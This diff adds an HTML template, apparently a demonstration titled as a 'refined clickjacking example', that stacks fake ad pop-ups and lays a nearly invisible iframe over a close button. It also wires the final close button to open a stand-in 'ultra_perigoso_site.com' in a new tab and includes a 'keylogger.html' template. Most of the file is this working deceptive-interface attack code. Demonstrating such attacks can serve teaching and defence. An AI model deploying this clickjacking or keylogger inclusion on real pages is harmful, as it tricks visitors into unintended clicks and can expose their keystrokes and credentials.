@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+
+
+{% block content %}
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exemplo de Clickjacking Refinado</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+            position: relative;
+        }
+
+        .ad-container {
+            position: absolute;
+            width: 300px;
+            height: 200px;
+            background-color: white;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            padding-top: 30px;
+        }
+
+        .ad-container h1 {
+            margin: 0;
+            font-size: 18px;
+            padding: 20px;
+        }
+
+        .close-button {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            width: 20px;
+            height: 20px;
+            background-color: red;
+            color: white;
+            font-size: 14px;
+            line-height: 20px;
+            text-align: center;
+            cursor: pointer;
+            z-index: 10;
+            text-decoration: none;
+        }
+
+        .iframe-container {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            width: 20px;
+            height: 20px;
+            overflow: hidden;
+            z-index: 100; /* Garante que o iframe esteja acima do botão */
+        }
+
+        .iframe-container iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            opacity: 0.01; /* Torna o iframe quase invisível */
+        }
+
+        .example-image {
+            position: absolute;
+            width: 600px;
+            height: 400px;
+            z-index: 0;
+        }
+    </style>
+</head>
+<body>
+    <img src="https://via.placeholder.com/600x400" class="example-image" alt="Imagem de Exemplo">
+
+    <div class="ad-container" style="top: calc(50% - 100px); left: calc(50% - 100px); transform: translate(-50%, -50%); z-index: 60;">
+        <a href="#" class="close-button" onclick="closeAd(event, 6)">X</a>
+        <h1>Propaganda Chata Número 6</h1>
+    </div>
+    <div class="ad-container" style="top: calc(50% - 80px); left: calc(50% - 80px); transform: translate(-50%, -50%); z-index: 50;">
+        <a href="#" class="close-button" onclick="closeAd(event, 5)">X</a>
+        <h1>Propaganda Chata Número 5</h1>
+    </div>
+    <div class="ad-container" style="top: calc(50% - 60px); left: calc(50% - 60px); transform: translate(-50%, -50%); z-index: 40;">
+        <a href="#" class="close-button" onclick="closeAd(event, 4)">X</a>
+        <h1>Propaganda Chata Número 4</h1>
+    </div>
+    <div class="ad-container" style="top: calc(50% - 40px); left: calc(50% - 40px); transform: translate(-50%, -50%); z-index: 30;">
+        <a href="#" class="close-button" onclick="closeAd(event, 3)">X</a>
+        <h1>Propaganda Chata Número 3</h1>
+    </div>
+    <div class="ad-container" style="top: calc(50% - 20px); left: calc(50% - 20px); transform: translate(-50%, -50%); z-index: 20;">
+        <a href="#" class="close-button" onclick="closeAd(event, 2)">X</a>
+        <h1>Propaganda Chata Número 2</h1>
+    </div>
+    <div class="ad-container" style="top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 10;">
+        <a href="#" class="close-button" onclick="closeAdAndOpenMaliciousSite(event)">X</a>
+        <h1>Propaganda Chata Número 1</h1>
+    </div>
+
+    <!-- Contêiner do iframe cobrindo o botão de fechar -->
+    <div class="iframe-container" style="top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 110;">
+        <iframe src="about:blank" id="maliciousSiteIframe"></iframe>
+    </div>
+
+    <script>
+        function closeAd(event, iframeId) {
+            event.preventDefault();
+            event.target.closest('.ad-container').style.display = 'none';
+        }
+
+        function closeAdAndOpenMaliciousSite(event) {
+            event.preventDefault();
+            event.target.closest('.ad-container').style.display = 'none';
+            openMaliciousSite();
+        }
+
+        function openMaliciousSite() {
+            // Abrir uma nova aba com a URL maliciosa
+            var newWindow = window.open("http://ultra_perigoso_site.com", "_blank");
+        }
+    </script>
+    {% include 'keylogger.html' %}
+</body>
+</html>
+{%endblock%}
